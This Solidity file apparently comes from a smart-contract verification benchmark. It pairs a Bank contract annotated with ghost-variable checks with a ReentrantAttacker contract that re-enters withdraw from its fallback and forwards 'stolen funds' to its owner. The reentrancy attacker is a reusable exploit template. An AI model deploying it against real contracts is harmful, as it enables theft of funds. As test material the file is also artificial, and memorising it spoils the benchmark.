//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

/// @custom:version conformant to specification
contract Bank {
    mapping (address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        /// @custom:preghost function withdraw
        uint old_contract_balance = address(this).balance;
        require(amount > 0);
        require(amount <= balances[msg.sender]);

        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        /// @custom:postghost function withdraw
        uint new_contract_balance = address(this).balance;
        assert(new_contract_balance == old_contract_balance - amount);
    }
}

contract ReentrantAttacker {
    Bank public targetBank;
    address public owner;
    uint public withdrawAmount;

    constructor(address _targetBank) {
        targetBank = Bank(_targetBank);
        owner = msg.sender;
    }
    function attack() external payable {
        require(msg.sender == owner, "Only owner can initiate attack");
        require(msg.value > 0, "Must send some Ether to initiate");
        withdrawAmount = msg.value;

        targetBank.deposit{value: msg.value}();
        targetBank.withdraw(msg.value);
    }

    fallback() external payable {
        if (address(targetBank).balance >= withdrawAmount) {
            targetBank.withdraw(withdrawAmount);
        }
    }
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner can withdraw stolen funds");
        payable(owner).transfer(address(this).balance);
    }
    receive() external payable {}
}